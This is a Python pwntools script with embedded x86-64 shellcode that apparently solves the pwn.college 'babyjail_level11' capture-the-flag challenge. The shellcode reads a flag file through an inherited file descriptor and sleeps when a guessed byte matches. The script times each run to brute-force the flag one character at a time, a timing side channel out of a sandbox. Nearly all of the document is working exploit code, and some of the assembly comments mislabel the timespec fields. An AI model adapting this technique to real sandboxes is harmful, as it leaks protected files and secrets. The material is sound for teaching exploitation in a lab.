assembly = """
; Assembly code to read the flag file and compare a byte at a specific index
xor rax, rax
push 3  ; Push the file descriptor for the flag file
pop rdi  ; Pop the file descriptor into rdi
lea rsi, [rip + flag_content]  ; Load the address of 'flag_content' into rsi
push 60  ; Number of bytes to read
pop rdx
syscall  ; System call to read the flag file

xor rbx, rbx
mov bl, byte ptr[rip + flag_content + {index}]  ; Load the byte at the specified index from flag_content into bl
cmp bl, {byte}  ; Compare the byte in bl with the given value
je do_nanosleep  ; If equal, jump to do_nanosleep
jmp do_nop  ; Otherwise, jump to do_nop

; System call nanosleep to delay the program for 0.5 seconds if the byte is correct
do_nanosleep: 
push 500000000  ; Push 500000000 (0.5 second in nanoseconds)
push 0  ; Push 0 for timespec.tv_nsec (sleep for 0.5s)
push rsp
pop rdi
push 0  ; Push 0 pointer for the interval timespec
pop rsi
push 35  ; Syscall number for nanosleep
pop rax  ; Pop 35 into rax
syscall

; Nop instruction for a breakpoint if the byte comparison is incorrect
; This helps determine the correct byte based on execution time
do_nop:
nop  ; Do nothing, just a breakpoint

; Storage for the bytes read from the flag
flag_content:
.rept 60  ; Repeat the directive 60 times
.byte 0 
.endr  ; End of the repetition block
"""

# This function determines the correct byte at a specific index in the flag
def get_flag_byte(byte_index):
    max_interval = 0
    best_byte = None
    for b in range(0x20, 0x7f):  # Iterate through all printable ASCII characters
        with pwn.process(['/challenge/babyjail_level11', '/flag'], close_fds=False) as p:
            t1 = time.time()  # Record start time
            p.send(pwn.asm(assembly.format(index=byte_index, byte=b)))  # Send the assembly code with the current byte
            p.poll(True)  # Wait for the process to finish
            t2 = time.time()  # Record end time
            interval = t2 - t1  # Calculate the time interval
            if interval > max_interval:  # If this interval is the longest so far, update the best byte
                max_interval = interval
                best_byte = b
    return chr(best_byte)  # Return the best byte as a character

# Main function to exploit the binary and retrieve the complete flag
def exploit():
    flag = 'pwn.college{'  # Initialize the flag with the known prefix
    for i in range(len(flag), 60):  # Iterate through the remaining bytes of the flag
        flag += get_flag_byte(i)  # Get the correct byte for the current index
        print(f'Flag: {flag}')  # Print the flag so far
    print(f'Final flag: {flag}')  # Print the final flag

if __name__ == "__main__":
    exploit()
